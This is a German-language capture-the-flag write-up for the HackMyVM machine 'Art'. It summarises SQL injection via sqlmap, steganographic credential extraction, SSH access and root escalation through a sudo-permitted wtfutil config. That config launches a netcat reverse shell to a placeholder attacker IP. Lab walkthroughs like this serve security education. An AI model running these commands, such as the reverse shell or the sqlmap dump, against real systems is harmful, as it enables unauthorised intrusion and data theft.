# Art - HackMyVM Writeup

![Art VM Icon](Art.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "Art" (Schwierigkeitsgrad: Easy), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** Art
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Easy
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Art](https://hackmyvm.eu/machines/machine.php?vm=Art)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 27. Oktober 2022
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/Art_HackMyVM_Easy/](https://alientec1908.github.io/Art_HackMyVM_Easy/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die Art-Maschine umfasste die folgenden Schritte:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.113`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte zwei offene Ports: SSH (22, OpenSSH 8.4p1) und HTTP (80, Nginx 1.18.0).
2.  **Web Enumeration:**
    *   `gobuster` und `feroxbuster` wurden zur Inhaltserkennung auf dem Webserver eingesetzt. `feroxbuster` fand `index.php` und mehrere `.jpg`-Dateien.
    *   Die Analyse des Quellcodes von `index.php` zeigte, dass die `.jpg`-Dateien angezeigt werden und enthielt einen HTML-Kommentar, der auf einen Parameter `tag` hinwies: ``.
3.  **Vulnerability Analysis (SQLi & Stego):**
    *   `wfuzz` bestätigte die Existenz des `tag`-Parameters.
    *   `sqlmap` wurde verwendet, um eine SQL-Injection-Schwachstelle im `tag`-Parameter auszunutzen (`-u "http://192.168.2.113/index.php?tag=" --level=5 --risk=3 --batch -D gallery --dump`).
    *   `sqlmap` identifizierte das Backend als MySQL/MariaDB und dumpte die Datenbank `gallery`. Die Tabelle `art` enthielt Tags und Bildnamen, darunter ein bisher unbekanntes Bild `dsa32.jpg`. Die Tabelle `users` enthielt Benutzernamen und Klartextpasswörter (z.B. `mina:realpazz`).
    *   Das Bild `dsa32.jpg` wurde heruntergeladen. `steghide info` zeigte, dass eine Datei `yes.txt` darin versteckt war.
    *   `stegseek` knackte das (leere) Passwort für die Steganographie und extrahierte `yes.txt` als `dsa32.jpg.out`.
    *   Der Inhalt von `dsa32.jpg.out` war `lion/shel0vesyou`, was auf Benutzername und Passwort hindeutete.
4.  **Initial Access (lion):**
    *   Erfolgreicher SSH-Login als Benutzer `lion` mit dem Passwort `shel0vesyou`.
    *   Die User-Flag (`/home/lion/user.txt`) wurde ausgelesen.
5.  **Privilege Escalation (lion -> root):**
    *   `sudo -l` für den Benutzer `lion` zeigte, dass `/bin/wtfutil` ohne Passwort als jeder Benutzer ausgeführt werden durfte: `(ALL : ALL) NOPASSWD: /bin/wtfutil`.
    *   Eine bösartige `config.yml`-Datei wurde erstellt, die `wtfutil` anwies, über das `cmdrunner`-Modul eine Netcat-Reverse-Shell (`nc -e /bin/bash [ATTACKER_IP] [PORT]`) zu starten.
    *   `wtfutil` wurde mit `sudo -u root /bin/wtfutil --config=/home/lion/config.yml` ausgeführt.
    *   Dies führte zu einer Reverse Shell als `root` auf dem Angreifer-System.
6.  **Flags:**
    *   Die User-Flag wurde als `lion` gelesen.
    *   Die Root-Flag wurde nach der Eskalation in `/var/opt/root.txt` gefunden und ausgelesen.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `feroxbuster`
*   `nikto`
*   Web Browser (impliziert für Quellcode-Analyse)
*   `wfuzz`
*   `sqlmap`
*   `steghide`
*   `stegseek`
*   `cat`
*   `ssh`
*   `sudo`
*   `wtfutil`
*   `nano` / Editor
*   `chmod`
*   `nc` (netcat)
*   `find`
*   `ls`

## Identifizierte Schwachstellen (Zusammenfassung)

*   **SQL-Injection:** Der GET-Parameter `tag` in `index.php` war anfällig für SQL-Injection, was zum Auslesen der Datenbank führte.
*   **Klartextpasswörter in Datenbank:** Die `users`-Tabelle enthielt Passwörter im Klartext.
*   **Steganographie mit schwachem/keinem Passwort:** Eine versteckte Datei in `dsa32.jpg` war mit einem leeren Passwort geschützt und enthielt Zugangsdaten.
*   **Unsichere `sudo`-Konfiguration:** Der Benutzer `lion` konnte `/bin/wtfutil` ohne Passwort als `root` ausführen. `wtfutil` erlaubte das Laden einer benutzerdefinierten Konfigurationsdatei, die zur Ausführung beliebiger Befehle als `root` missbraucht werden konnte (über das `cmdrunner`-Modul).

## Flags

*   **User Flag (`/home/lion/user.txt`):** `HMVygUmTyvRPWduINKYfmpO`
*   **Root Flag (`/var/opt/root.txt`):** `mZxbPCjEQYOqkNCuyIuTHMV`

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
